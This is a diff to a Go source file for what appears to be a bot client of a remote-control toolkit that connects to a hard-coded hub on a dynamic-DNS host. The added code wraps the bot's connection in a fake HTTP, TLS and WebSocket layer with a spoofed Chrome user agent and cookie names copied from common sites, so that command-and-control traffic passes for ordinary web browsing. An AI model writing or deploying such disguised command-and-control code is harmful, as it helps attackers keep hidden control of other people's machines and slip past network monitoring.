@@ -5,8 +5,10 @@ import (
 	"encoding/base64"
 	"runtime"
 	"strings"
+	"net"
 	"fmt"
 
+	"./lib/fakehttp"
 	kit "./lib/toolkit"
 	"./lib/base"
 )
@@ -16,6 +18,18 @@ var hubPubKey, _ = base64.StdEncoding.DecodeString("MIIBIjANBgkqhkiG9w0BAQEFAAOC
 var hubAddr string = "cs8425.noip.me:8787"
 
 var proc int = runtime.NumCPU() + 2
+
+const (
+	fakeHttp = true
+	tls = true
+	wsObf = true
+
+	targetUrl = "/"
+	tokenCookieA = "cna"
+	tokenCookieB = "_tb_token_"
+	tokenCookieC = "_cna"
+	userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36"
+)
 
 func initBot(c *base.Client) {
 	c.Info.Set("NumCPU", fmt.Sprintf("%v", runtime.NumCPU()))
@@ -64,6 +78,26 @@ func main() {
 //	c.Info.Set("AIS3-2", "test2")
 
 	c.Proc = proc
+
+	if fakeHttp {
+		var cl *fakehttp.Client
+		if tls {
+			cl = fakehttp.NewTLSClient("", nil, true)
+		} else {
+			cl = fakehttp.NewClient("")
+		}
+		cl.TokenCookieA = tokenCookieA
+		cl.TokenCookieB = tokenCookieB
+		cl.TokenCookieC = tokenCookieC
+		cl.UseWs = wsObf
+		cl.UserAgent = userAgent
+		cl.Url = targetUrl
+
+		c.Dial = func(addr string) (net.Conn, error) {
+			cl.Host = addr
+			return cl.Dial()
+		}
+	}
 
 	c.Start(hubAddr)
 
